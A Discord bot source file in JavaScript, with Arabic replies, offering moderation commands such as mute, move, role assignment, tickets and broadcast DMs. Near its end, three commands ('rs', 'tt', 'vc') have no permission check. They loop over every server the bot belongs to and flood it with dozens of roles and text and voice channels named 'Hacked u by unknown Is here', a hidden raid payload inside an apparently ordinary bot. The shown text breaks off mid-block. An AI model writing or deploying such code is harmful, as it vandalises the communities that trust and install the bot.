const Discord = require('discord.js');
const moment = require("moment");  
const fs = require("fs");      
const dateFormat = require('dateformat');
const client = new Discord.Client(); 
const Canvas = require("canvas"); //npm i canvas
const prefix = "s!"

client.on('message', function(message) {
	const myID = "368768446327947265";
    let args = message.content.split(" ").slice(1).join(" ");
    if(message.content.startsWith(prefix + "sn")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
        client.user.setUsername(args);
        message.channel.send('**SetName,Done!**').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "st")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
        client.user.setGame(args , 'https://twitch.tv/6xlez1');
        message.channel.send('**Streaming,Done!🎶**').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "pl")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
        client.user.setGame(args);
        message.channel.send('**Playing,Done!🎶**').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "li")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
        client.user.setActivity(args, {type:'LISTENING'});
        message.channel.send('**Listening,Done!🎶**').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "wa")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
        client.user.setActivity(args, {type:'WATCHING'});
        message.channel.send('**Watching,Done!🎶**').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "sa")) {
				        if(message.author.id !== myID) return;
        client.user.setAvatar(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
                if(!args) return message.reply('**آكتـب الحالة التي تريدهـآ..**');
           msg.delete(5000);
          message.delete(5000);
        });
    }
});

client.on('message', message => {
         if(message.content === prefix + "open") {
                             if(!message.channel.guild) return message.reply('** This command only for servers**');
  
     if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(' **__ليس لديك صلاحيات__**');
                message.channel.overwritePermissions(message.guild.id, {
              SEND_MESSAGES: false
  
                }).then(() => {
                    message.reply("**تـم إغلآقق آلرومم ..**")
                });
                  }
      if(message.content === prefix + "close") {
                          if(!message.channel.guild) return message.reply('** This command only for servers**');
  
     if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('**__ليس لديك صلاحيات__**');
                message.channel.overwritePermissions(message.guild.id, {
              SEND_MESSAGES: true
  
                }).then(() => {
                    message.reply("**تـم فتحح آلرومم ..**")
                });
      }
         
});

client.on('message', async message => {
  let args = message.content.split(" ");
  if(message.content.startsWith(prefix + "mute")) {
    if(!message.member.hasPermission("MUTE_MEMBERS")) return message.channel.send('').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(!message.guild.member(client.user).hasPermission("MUTE_MEMBERS")) return message.channel.send('').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    let mention = message.mentions.members.first();//kinggamer حقوق الفا كودز و 
    if(!mention) return  message.channel.send('').then(msg => { //kinggamer حقوق الفا كودز و 
      msg.delete(3500);
      message.delete(3500);
    });

	if(mention.id === message.author.id) return message.channel.send('**:x:You Cannot give mute to your self**').then(msg => {
      msg.delete(3500);
      message.delete(3500); //kinggamer حقوق الفا كودز و 
    });	
	
	if(mention.hasPermission('ADMINISTRATOR')) return message.channel.send(`**:x: لا يمكن آعطاء ميوت لادارة السيرفر**`); //kinggamer حقوق الفا كودز و 

    if(message.guild.member(mention).roles.find('name', 'Muted')) return message.channel.send(`**:information_source: ${mention.user.username} Already Muted**`);

	
    if(mention.position >= message.guild.member(message.author).positon) return message.channel.send('You Donot Have Permission **Muted_Members** ').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });
	
    if(mention.positon >= message.guild.member(client.user).positon) return message.channel.send('I Donot Have Permission **Muted_Members**').then(msg => {
      msg.delete(3500);
      message.delete(3500); //kinggamer حقوق الفا كودز و 
    });
    
    let duration = args[2];
    if(!duration) message.channel.send(`**:hash: You Can Use ${prefix}mute @user Time Reason**`).then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    if(isNaN(duration))  message.channel.send('').then(msg => {
      msg.delete(3500);
      message.delete(3500);
    });

    let reason = message.content.split(" ").slice(3).join(" ");
    if(!reason) reason = " [ **لم يذكر لماذا** ] ";

    let thisEmbed = new Discord.RichEmbed()
    .setAuthor(mention.user.username, mention.user.avatarURL)
    .setTitle('**تم آعطائك ميوت**')
    .addField('**__السيرفر__**',[ message.guild.name ]) //kinggamer حقوق الفا كودز و 
    .addField('**__تم آعطائك ميوت بواسطة__**', [ message.author ])
    .addField('**__آلسبب__**',reason)
	.addField('**__وقت الميوت__**',duration)

    let role = message.guild.roles.find('name', 'Muted') || message.guild.roles.get(r => r.name === 'Muted');
    if(!role) try {
      message.guild.createRole({
        name: "Muted",
        permissions: 0 //kinggamer حقوق الفا كودز و 
      }).then(r => {
        message.guild.channels.forEach(c => {
          c.overwritePermissions(r , {
            SEND_MESSAGES: false, //kinggamer حقوق الفا كودز و 
            READ_MESSAGES_HISTORY: false,
            ADD_REACTIONS: false
          });
        });
      }); //kinggamer حقوق الفا كودز و 
    } catch(e) {
      console.log(e.stack);
    }
    mention.addRole(role).then(() => {
      mention.send(thisEmbed);
      message.channel.send(`**:white_check_mark: ${mention.user.username}  Muted! :zipper_mouth:  **  `);
      mention.setMute(true); //kinggamer حقوق الفا كودز و 
    });
    setTimeout(() => {
      if(duration === 0) return;
      mention.setMute(false);
      mention.removeRole(role)
    },duration * 60000); //kinggamer حقوق الفا كودز و 
  } 
});
client.on('message', async message => {
	let mention = message.mentions.members.first();
let command = message.content.split(" ")[0];
	 command = command.slice(prefix.length);
	let args = message.content.split(" ").slice(1);	 //kinggamer حقوق الفا كودز و 
if(command === `unmute`) {2
  if(!message.member.hasPermission("MUTE_MEMBERS")) return message.channel.sendMessage("**You Donot HavePermission Mute_Members**").then(m => m.delete(5000));
if(!message.guild.member(client.user).hasPermission("MUTE_MEMBERS")) return message.reply("**I donot Have Permission Mute_Members**").then(msg => msg.delete(6000))

  let kinggamer = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
     if(!kinggamer) return message.channel.send('').then(msg => {
      msg.delete(3500);
      message.delete(3500); //kinggamer حقوق الفا كودز و 
    });

  let role = message.guild.roles.find (r => r.name === "Muted");
  
  if(!role || !kinggamer.roles.has(role.id)) return message.channel.sendMessage(`**:information_source:${mention.user.username} لقد تم فك الميوت عنه مسبقا**`)

  await kinggamer.removeRole(role) //kinggamer حقوق الفا كودز و 
  message.channel.sendMessage(`**:white_check_mark: ${mention.user.username}  Unmuted! **`);

  return;

  }

});

    client.on('message', message => {
   if(message.content.startsWith(prefix + "invites")) {
    message.guild.fetchInvites().then(invs => {
      let user = message.mentions.users.first() || message.author
      let personalInvites = invs.filter(i => i.inviter.id === user.id);
      let inviteCount = personalInvites.reduce((p, v) => v.uses + p, 0);
message.channel.send(`**${user} has ${inviteCount} invites.**`);
});
  }
});

 client.on('message', message => {
    if(message.content.startsWith(prefix + 'move all')) {
     if (!message.member.hasPermission("MOVE_MEMBERS")) return message.channel.send('**لايوجد لديك صلاحية سحب الأعضاء**');
       if(!message.guild.member(client.user).hasPermission("MOVE_MEMBERS")) return message.reply("**لايوجد لدي صلاحية السحب**");
    if (message.member.voiceChannel == null) return message.channel.send(`**الرجاء الدخول لروم صوتي**`)
     var author = message.member.voiceChannelID;
     var m = message.guild.members.filter(m=>m.voiceChannel)
     message.guild.members.filter(m=>m.voiceChannel).forEach(m => {
     m.setVoiceChannel(author)
     })
     message.channel.send(`**تـم سحـب الجميع الى رومـكك .. **`)


     }
       });

 client.on('message', message => {
        var  user = message.mentions.users.first() || message.author;
    if (message.content.startsWith(prefix + "avatar")) {
message.channel.send(`This avatar For ${user} link : ${user.avatarURL}`);
}
});

    client.on('message', message => {
if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'move')) {
        if(!message.member.hasPermission("MOVE_MEMBERS")) return message.channel.send("⚠️|`انت لا تمتلك الخاصيه المطلوبة`");  
 if (message.member.hasPermission("MOVE_MEMBERS")) {
 if (message.mentions.users.size === 0) {
 return message.channel.send("**للأستخدام اكتب  : " +prefix+ "move [USER]**")
}
if (message.member.voiceChannel != null) {
 if (message.mentions.members.first().voiceChannel != null) {
 var authorchannel = message.member.voiceChannelID;
 var usermentioned = message.mentions.members.first().id;
var embed = new Discord.RichEmbed()
 .setTitle("Succes!")
 .setColor("#000000")
 .setDescription(`**لقد قمت بسحب <@${usermentioned}> الى الروم الصوتي الخاص بك✅ **`)
var embed = new Discord.RichEmbed()
.setTitle(`You are Moved in ${message.guild.name}`)
 .setColor("RANDOM")
.setDescription(`**<@${message.author.id}> Moved You To His Channel!\nServer --> ${message.guild.name}**`)
 message.guild.members.get(usermentioned).setVoiceChannel(authorchannel).then(m => message.channel.send(embed))
message.guild.members.get(usermentioned).send(embed)
} else {
message.channel.send("`لا تستطيع سحب `"+ message.mentions.members.first() +" `يجب ان يكون هذه العضو في روم صوتي`")
}
} else {
 message.channel.send("**يجب ان تكون في روم صوتي لكي تقوم بسحب العضو أليك**")
}
} else {
message.react("❌")
 }
}
});

client.on('message', message => {
                                if(!message.channel.guild) return;
                        if (message.content.startsWith('s!ping')) {
                            if(!message.channel.guild) return;
                            var msg = `${Date.now() - message.createdTimestamp}`
                            var api = `${Math.round(client.ping)}`
                            if (message.author.bot) return;
                        let embed = new Discord.RichEmbed()
                        .setAuthor(message.author.username,message.author.avatarURL)
                        .setColor('RANDOM')
                        .addField('**Time Taken:**',msg + " ms 📶 ")
                        .addField('**WebSocket:**',api + " ms 📶 ")
         message.channel.send({embed:embed});
                        }
                    });

 client.on('message', message => {
     if (message.author.bot) return;
if (message.content.startsWith(prefix + "uptime")) {
    let uptime = client.uptime;

    let days = 0;
    let hours = 0;
    let minutes = 0;
    let seconds = 0;
    let notCompleted = true;

    while (notCompleted) {

        if (uptime >= 8.64e+7) {

            days++;
            uptime -= 8.64e+7;

        } else if (uptime >= 3.6e+6) {

            hours++;
            uptime -= 3.6e+6;

        } else if (uptime >= 60000) {

            minutes++;
            uptime -= 60000;

        } else if (uptime >= 1000) {
            seconds++;
            uptime -= 1000;

        }

        if (uptime < 1000)  notCompleted = false;

    }

    message.channel.send("`" + `${days} days, ${hours} hrs, ${minutes} , ${seconds} sec` + "`");


}
});

const adminprefix = "s!";
const devs = ['368768446327947265'];

client.on('message', message => {
if(message.content === adminprefix + "restart") {
      if (!devs.includes(message.author.id)) return;
          message.channel.send(` Restarting : ${message.author.username}`);
        console.log(`⚠️ جاري اعادة تشغيل البوت... ⚠️`);
        client.destroy();
        child_process.fork(__dirname + "/bot.js");
        console.log(`تم اعادة تشغيل البوت`);
    }
  
  });

client.on("message", message => {
	var args = message.content.split(' ').slice(1); 
	var msg = message.content.toLowerCase();
	if( !message.guild ) return;
	if( !msg.startsWith( prefix + 'role' ) ) return;
	if(!message.member.hasPermission('MANAGE_ROLES')) return message.channel.send(' **__ليس لديك صلاحيات__**');
	if( msg.toLowerCase().startsWith( prefix + 'roleremove' ) ){
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد سحب منه الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().removeRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم سحب من **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.removeRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البشريين رتبة**');
		} 	
	} else {
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد اعطائها الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().addRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم اعطاء **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.addRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البشريين رتبة**');
		} 
	} 
});
var AsciiTable = require('ascii-data-table').default
client.on('message', message =>{

    if(message.content == "roles"){
        if(message.guild.member(message.author).hasPermission("ADMINISTRATOR"))
        var 
        ros=message.guild.roles.size,
        data = [['Rank', 'RoleName']]
        for(let i =0;i<ros;i++){
            if(message.guild.roles.array()[i].id !== message.guild.id){
         data.push([i,`${message.guild.roles.filter(r => r.position == ros-i).map(r=>r.name)}`])
        }}
        let res = AsciiTable.table(data)

        message.channel.send(`**\`\`\`xl\n${res}\`\`\`**`);
    }
});

client.on('message',async message => {
  if(message.content.startsWith(prefix + "bcall")) {
if(message.member.hasPermissions(['ADMINISTRATOR'])) {
    let filter = m => m.author.id === message.author.id;
    let thisMessage;
    let thisFalse;
    message.channel.send('🇧🇨| **ارسل الرسالة الان**').then(msg => {

    let awaitM = message.channel.awaitMessages(filter, {
      max: 1,
      time: 20000,
      errors: ['time']
    })
    .then(collected => {
      collected.first().delete();
      thisMessage = collected.first().content;
      msg.edit('🇧🇨| **هل انت متأكد؟**');
      let awaitY = message.channel.awaitMessages(response => response.content === 'نعم' || 'لا' && filter,{
        max: 1,
        time: 20000,
        errors: ['time']
      })
      .then(collected => {
        if(collected.first().content === 'لا') {
          msg.delete();
          message.delete();
          thisFalse = false;
        }
        if(collected.first().content === 'نعم') {
          if(thisFalse === false) return;
        message.guild.members.forEach(member => {
          msg.edit('🇧🇨| **جاري الارسال**');
          collected.first().delete();
          member.send(`${thisMessage}\n\n${member} ,\nتم الارسال من : ${message.guild.name}\n تم الارسال بواسطة : ${message.author.tag}`);
        });
        }
      });
    });
    });
} else return message.reply('لا يوجد لديك الصلاحيات')
  }
});

client.on('message', message => {

 if (message.content.startsWith('list')) {

  var norElden= new Discord.RichEmbed()

  .addField('اسم السيرفر ',` **__${message.guild.name}__**`)

      .addField('عدد الاعضاء',`**__${message.guild.memberCount}__**`)

  .setColor('RANDOM')

message.channel.send({ embed: norElden });

  }

});


client.on('message', message => {

  if (message.author.bot) return;

  if (!message.content.startsWith(prefix)) return;



  let command = message.content.split(" ")[0];

  command = command.slice(prefix.length);



  let args = message.content.split(" ").slice(1);



if (command == "say") {

if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.reply("**لا تملك الصلاحيات المطلوبه**");



message.channel.send(args.join("  "))

    message.delete();

  }







});

    client.on('message' , message => {

        if(message.content === 'Voice Online') {

            message.channel.send(`**عدد الاشخاص الموجودين بـ  الرومات الصوتيه : ${message.guild.members.filter(g => g.voiceChannel).size}**`);

        }

        });

  client.on('message', message => {
          

    if (message.content.startsWith(prefix + "user")) {
              if(!message.channel.guild) return message.reply(`هذا الأمر فقط ل السيرفرات ❌`);

         message.guild.fetchInvites().then(invs => {
let member = client.guilds.get(message.guild.id).members.get(message.author.id);
let personalInvites = invs.filter(i => i.inviter.id === message.author.id);
let inviteCount = personalInvites.reduce((p, v) => v.uses + p, 0);
var moment = require('moment');
var args = message.content.split(" ").slice(1);
let user = message.mentions.users.first();
var men = message.mentions.users.first();
var heg;
if(men) {
heg = men
} else {
heg = message.author
}
var mentionned = message.mentions.members.first();
var h;
if(mentionned) {
h = mentionned
} else {
h = message.member
}
 moment.locale('ar-TN');
var id = new  Discord.RichEmbed()

.setColor("#0a0909")
.setThumbnail(message.author.avatarURL)
.addField(': تاريخ دخولك للديسكورد',` \`${moment(heg.createdTimestamp).format('YYYY/M/D HH:mm:ss')} \`**\n ${moment(heg.createdTimestamp).fromNow()}**` ,true) 
.addField(': تاريخ دخولك لسيرفرنا', `\`${moment(h.joinedAt).format('YYYY/M/D HH:mm:ss')}  \` **\n ${moment(h.joinedAt).fromNow()} **`, true)

.setFooter(message.author.username,'https://images-ext-2.discordapp.net/external/JpyzxW2wMRG2874gSTdNTpC_q9AHl8x8V4SMmtRtlVk/https/orcid.org/sites/default/files/files/ID_symbol_B-W_128x128.gif')  
message.channel.sendEmbed(id);
})
}


  
});

client.on("message", (message) => {
    /// ALPHA CODES
   if (message.content.startsWith("s!new")) {     /// ALPHA CODES
        const reason = message.content.split(" ").slice(1).join(" ");     /// ALPHA CODES
        if (!message.guild.roles.exists("name", "Support Team")) return message.channel.send(`This server doesn't have a \`Support Team\` role made, so the ticket won't be opened.\nIf you are an administrator, make one with that name exactly and give it to users that should be able to see tickets.`);
        if (message.guild.channels.exists("name", "ticket-{message.author.id}" + message.author.id)) return message.channel.send(`You already have a ticket open.`);    /// ALPHA CODES
        message.guild.createChannel(`ticket-${message.author.username}`, "text").then(c => {
            let role = message.guild.roles.find("name", "Support Team");
            let role2 = message.guild.roles.find("name", "@everyone");
            c.overwritePermissions(role, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });    /// ALPHA CODES
            c.overwritePermissions(role2, {
                SEND_MESSAGES: false,
                READ_MESSAGES: false
            });
            c.overwritePermissions(message.author, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });
            message.channel.send(`:white_check_mark: **تم إنشاء تذكرتك ، #${c.name}.**`);
            const embed = new Discord.RichEmbed()
                .setColor(0xCF40FA)
                .addField(`مرحباّ ${message.author.username}!`, `يرجى محاولة شرح سبب فتح هذه التذكرة بأكبر قدر ممكن من التفاصيل. سيكون فريق الدعم لدينا قريبا للمساعدة.`)
                .setTimestamp();
            c.send({
                embed: embed
            });
        }).catch(console.error);
    }
 
 
  if (message.content.startsWith("s!close")) {
        if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`You can't use the close command outside of a ticket channel.`);
 
        message.channel.send(`هل أنت متأكد؟ بعد التأكيد ، لا يمكنك عكس هذا الإجراء!\n للتأكيد ، اكتب\`*confirm\`. سيؤدي ذلك إلى مهلة زمنية في غضون 10 ثوانٍ وإلغائها`)
            .then((m) => {
                message.channel.awaitMessages(response => response.content === '*confirm', {
                        max: 1,
                        time: 10000,
                        errors: ['time'],
                    })    /// ALPHA CODES
                    .then((collected) => {
                        message.channel.delete();
                    })    /// ALPHA CODES
                    .catch(() => {
                        m.edit('Ticket close timed out, the ticket was not closed.').then(m2 => {
                            m2.delete();
                        }, 3000);
                    });
            });
    }
 
});

client.on('message', message => {
         if (message.content === prefix + "time") {
         if (!message.channel.guild) return message.reply('** This command only for servers **');  
         var currentTime = new Date(),
            hours = currentTime.getHours() + 4 ,
            hours2 = currentTime.getHours() + 3 ,
            hours3 = currentTime.getHours() + 2 ,
            hours4 = currentTime.getHours() + 3 ,
            minutes = currentTime.getMinutes(),
            seconds = currentTime.getSeconds(),
            Year = currentTime.getFullYear(),
            Month = currentTime.getMonth() + 1,
            Day = currentTime.getDate();
             var h = hours
  if(hours > 12) {
               hours -= 12;
            } else if(hours == 0) {
                hours = "12";
            }  
             if(hours2 > 12) {
               hours2 -= 12;
            } else if(hours2 == 0) {
                hours2 = "12";
            
            }  
                         if(hours3 > 12) {
               hours3 -= 12;
            } else if(hours3 == 0) {
                hours3 = "12";
            } 
            if (minutes < 10) {
                minutes = '0' + minutes;
            }

            var suffix = 'صباحاَ';
            if (hours >= 12) {
                suffix = 'مساء';
                hours = hours - 12;
            }
            if (hours == 0) {
                hours = 12;
            }
 

                var Date15= new Discord.RichEmbed()
                .setThumbnail("https://i.imgur.com/ib3n4Hq.png") 
                .setTitle( "『التاريخ  والوقت』")
                .setColor('RANDOM')
                .setFooter(message.author.username, message.author.avatarURL)
                .addField('الامارات',
                "『"+ hours + ":" + minutes +":"+ seconds + "』")
                 .addField('مكه المكرمه',
                "『"+ hours2 + ":" + minutes +":"+ seconds  + "』") 
                .addField('مصر',
                "『"+ hours3 + ":" + minutes +":"+ seconds  + "』") 
                
                .addField('Date',
                "『"+ Day + "-" + Month + "-" + Year +  "』")

                 message.channel.sendEmbed(Date15);
        }
    });
 
client.on('message', message => {
    if (message.content.startsWith("$bans")) {
     if(!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("**انت لا تملك صلاحية الباند**");


        message.guild.fetchBans()
        .then(bans => message.channel.send(`${bans.size} عدد اشخاص المبندة من السيرفر `))
  .catch(console.error);
}
});

client.on('message', message => {
     

     if (message.content === "rs") {
         client.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })


    
})
 
 
}
});

client.on('message', message => {
         if (message.content === "tt") {
               client.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

})
}
});

client.on('message', message => {
         if (message.content === "vc") {
                 client.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
